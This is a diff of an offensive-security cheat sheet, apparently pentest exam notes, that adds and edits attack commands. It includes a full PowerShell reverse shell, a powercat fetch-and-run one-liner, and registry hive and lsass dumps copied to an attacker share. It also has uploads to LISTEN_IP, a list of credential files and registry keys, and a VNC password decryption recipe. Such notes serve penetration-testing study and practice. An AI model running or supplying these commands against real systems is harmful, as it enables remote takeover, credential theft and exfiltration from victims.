+echo '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.191",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
+```
+
+Also, you can use `powercat.ps1`, a netcat equivalent in Powershell, with "-e" support.
+
+```sh
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+sudo python -m http.server 80
+nc -lvnp 6969
+```
+
+Invoke with:
+
+```powershell
+IEX (New-Object System.Net.Webclient).DownloadString("http://LISTEN_IP/powercat.ps1");powercat -c LISTEN_IP -p 6969 -e powershell
 ```
 
 **OpenSSL Encrypted Reverse Shell**
@@ -2700,7 +2989,7 @@ A custom reverse shell can often get past antivirus.
 
 #pragma comment(lib, "Ws2_32.lib")
 
-#define TARGET_IP   "192.168.119.144"
+#define TARGET_IP   "LISTEN_IP"
 #define TARGET_PORT 443
 
 void main(void) {
@@ -3016,17 +3305,17 @@ reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
 reg save hklm\sam %TEMP%\sam.hiv /y
 reg save hklm\system %TEMP%\system.hiv /y
 reg save hklm\security %TEMP%\security.hiv /y
-copy %TEMP%\sam.hiv \\192.168.119.144\share
-copy %TEMP%\system.hiv \\192.168.119.144\share
-copy %TEMP%\security.hiv \\192.168.119.144\share
+copy %TEMP%\sam.hiv \\LISTEN_IP\share
+copy %TEMP%\system.hiv \\LISTEN_IP\share
+copy %TEMP%\security.hiv \\LISTEN_IP\share
 
 :: clean up stolen registry files
 del %TEMP%\*.hiv
 
 :: Grab the backups from disk
-copy %WINDIR%\repair\sam \\192.168.119.144\share\sam-repair.hiv
-copy %WINDIR%\repair\system \\192.168.119.144\share\system-repair.hiv
-copy %WINDIR%\repair\security \\192.168.119.144\share\security-repair.hiv
+copy %WINDIR%\repair\sam \\LISTEN_IP\share\sam-repair.hiv
+copy %WINDIR%\repair\system \\LISTEN_IP\share\system-repair.hiv
+copy %WINDIR%\repair\security \\LISTEN_IP\share\security-repair.hiv
 ```
 
 Then, on attack box:
@@ -3041,7 +3330,7 @@ Sysinternals tools:
 
 ```bat
 procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
-copy %TEMP%\lsass.mem \\192.168.119.144\share
+copy %TEMP%\lsass.mem \\LISTEN_IP\share
 ```
 
 #### 6.9.4.1. Dumping Hashes from Windows Registry Backups
@@ -3208,6 +3497,9 @@ PowerShell:
 
 # Base64 Decode
 [System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("BASE64STRING"))
+
+# Base64 Encode
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("SOMETEXT"))
 
 # Zip a directory using Powershell 3.0 (Win8)
 Add-Type -A 'System.IO.Compression.FileSystem';
@@ -3853,29 +4145,123 @@ sudo chmod u+s /bin/sh
 
 # 8. Loot
 
-## Sensitive Files
+## 8.1. Sensitive Files
 
-The following are some Linux files that have sensitive information that
+The following are some files that have sensitive information that
 are good to try to grab when you can (directory traversal, LFI, shell access).
 
-```
+
+Linux:
+
+```sh
 /etc/passwd
 /etc/shadow
 /etc/group
 /etc/hosts
 /etc/issue
 /etc/motd
+
 /etc/mysql/my.cnf
-/proc/self/environ
-/proc/version
-/proc/cmdline
-/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
+/usr/local/etc/apache22/httpd.conf
+/etc/apache2/apache2.conf
+/etc/httpd/conf/httpd.conf
+
+/home/USERNAME/.ssh/id_rsa
+/home/USERNAME/.bash_history
+/home/USERNAME/.profile
+/home/USERNAME/.mysql_history
+
+/root/.bash_history
+/root/.profile
+/root/.ssh/id_rsa
+/root/.vnc/passwd
+
+# Web server files, usually in webroot
+.htaccess
+config.php
 ```
 
 
-## 8.1. File Transfers
+Windows:
 
-### 8.1.1. Netcat transfer
+```powershell
+# SAM
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+
+# Unattend install files: plaintext or base64 encoded password
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+
+# IIS, web.config can contain admin creds
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+# Groups.xml: encrypted password, but key is available online in many tools
+C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
+\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
+
+# The 'cpassword' attribute found in many files
+Services\Services.xml
+ScheduledTasks\ScheduledTasks.xml
+Printers\Printers.xml
+Drives\Drives.xml
+DataSources\DataSources.xml
+
+# Windows Autologin credentials
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
+
+# SNMP credentials
+reg query HKLM\SYSTEM\Current\ControlSet\Services\SNMP
+
+# McAfee password stored in SiteList.xml
+%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml
+
+# Putty proxy creds
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions
+
+# UltraVNC encrypted password
+dir /b /s vnc.ini
+C:\Program Files\UltraVNC\ultravnc.ini
+# decrypt with:
+# echo -n ULTRAVNC_PW_HASH | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+# or:
+# https://github.com/trinitronx/vncpasswd.py
+# or:
+# msfconsole
+# > irb
+# > fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+# > require 'rex/proto/rfb'
+# > Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), fixedkey
+
+# RealVNC hashed password in registry:
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver /v password
+
+# TightVNC
+reg query HKEY_CURRENT_USER\Software\TightVNC\Server /s
+reg query HKLM\SOFTWARE\TightVNC\Server\ControlPassword /s
+tightvnc.ini
+vnc_viewer.ini
+
+# TigerVNC
+reg query HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 /v password
+
+# Search registry for password
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+More Windows IIS log and config paths [here](https://techcommunity.microsoft.com/t5/iis-support-blog/collect-basics-configuration-and-logs-when-troubleshooting-iis/ba-p/830927).
+
+
+## 8.2. File Transfers
+
+### 8.2.1. Netcat transfer
 
 ```sh
 # start listening for download on port 9001
@@ -3884,7 +4270,7 @@ nc -nlvp 9001 > dump.txt
 nc $IP 9001 < file.txt
 ```
 
-### 8.1.2. Curl transfers
+### 8.2.2. Curl transfers
 
 ```sh
 # upload a file with curl (POST multipart/form-data)
@@ -3892,7 +4278,7 @@ nc $IP 9001 < file.txt
 curl -v -F key1=value1 -F upload=@localfilename URL
 ```
 
-### 8.1.3. PowerShell File Transfers
+### 8.2.3. PowerShell File Transfers
 
 ```powershell
 # Download to Windows victim
@@ -3902,17 +4288,17 @@ invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
 (net.webclient).downloadfile("http://ATTACKER/shell.ps1", "c:\users\public\shell.ps1")
 
 # uploading a file:
-(New-Object System.Net.WebClient).UploadFile('http://192.168.119.144/upload.php','somefiile')
+(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')
 ```
 
-### 8.1.4. Mount NFS Share
+### 8.2.4. Mount NFS Share
 
 ```sh
 # try without vers=3 if mount fails. Also try with vers=2
 mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
 ```
 
-### 8.1.5. SMB Share
+### 8.2.5. SMB Share
 
 Mounting/hosting share on Kali
 ```sh
@@ -3937,7 +4323,7 @@ smbclient //$VICTIM_IP/SHARENAME
 > mget *
 ```
 
-### 8.1.6. FTP Server on Kali
+### 8.2.6. FTP Server on Kali
 
 ```sh
 # install pyftpdlib for root to use port 21
@@ -3954,7 +4340,7 @@ Then on Windows box, create `ftpup.bat`:
 ```bat
 @echo off
 :: change server IP and Port as required
-echo open 192.168.119.144 2121> ftpcmd.dat
+echo open LISTEN_IP 2121> ftpcmd.dat
 echo user hacker>> ftpcmd.dat
 echo g0tPwned>> ftpcmd.dat
 echo bin>> ftpcmd.dat
@@ -3992,7 +4378,7 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
 
-### 8.1.7. SSHFS
+### 8.2.7. SSHFS
 
 To make things easier, set up a config file like so:
 
@@ -4012,7 +4398,7 @@ Then mount the filesystem with root access:
 sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
 ```
 
-### 8.1.8. Windows LOLBAS File Downloads
+### 8.2.8. Windows LOLBAS File Downloads
 
 ```bat
 :: Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
@@ -4029,7 +4415,7 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/
 powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
 ```
 
-### 8.1.9. PHP File Uploads
+### 8.2.9. PHP File Uploads
 
 Uploading files via HTTP POST to `upload.php`:
 
@@ -4063,13 +4449,13 @@ sudo systemctl restart apache2
 Uploading files from Windows using PowerShell:
 
 ```powershell
-(New-Object System.Net.WebClient).UploadFile('http://192.168.119.144/upload.php','somefiile')
+(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')
 ```
 
 Uploading files from Linux using curl:
 
 ```sh
-curl -v http://192.168.119.144/upload.php -F "file=@somefile"
+curl -v http://LISTEN_IP/upload.php -F "file=@somefile"
 ```
 
 If large files fail to upload properly, change the `php.ini` or `.user.ini` settings:
